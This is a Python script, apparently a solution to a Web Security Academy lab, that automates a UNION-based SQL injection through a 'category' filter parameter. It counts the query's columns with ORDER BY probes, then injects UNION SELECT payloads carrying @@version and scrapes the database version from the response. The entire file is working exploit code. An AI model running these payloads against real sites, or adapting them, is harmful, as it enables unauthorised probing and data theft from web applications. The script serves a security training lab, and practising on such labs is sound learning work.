import requests
import sys
from bs4 import BeautifulSoup

def get_num_of_columns(lab_url):
    num_of_columns = 0
    for i in range(1,20):
        response = requests.get(f"{lab_url}/filter?category=x'+ORDER+BY+{i}%23")
        if response.status_code == 500:
            num_of_columns = i - 1
            break
    return num_of_columns

def extract_text(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    version_string = soup.find('tbody')
    return version_string.get_text().strip()

def get_db_version(num_of_columns):
    for i in range(num_of_columns):
        payload = ["NULL"] * num_of_columns
        payload[i] = "@@version"
        payload = ",".join(payload)
        url = f"{lab_url}/filter?category=x'+UNION+SELECT+{payload}%23"
        response = requests.get(url)
        if response.status_code == 200:
            return extract_text(response)

if __name__=="__main__":
    try:
        lab_url = sys.argv[1].rstrip('/')
        num_of_columns = get_num_of_columns(lab_url)
        database_version = get_db_version(num_of_columns)
        print(f"Database version: {database_version}")

    except IndexError:
        print(f"Usage: python3 {sys.argv[0]} <url> \nExample: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")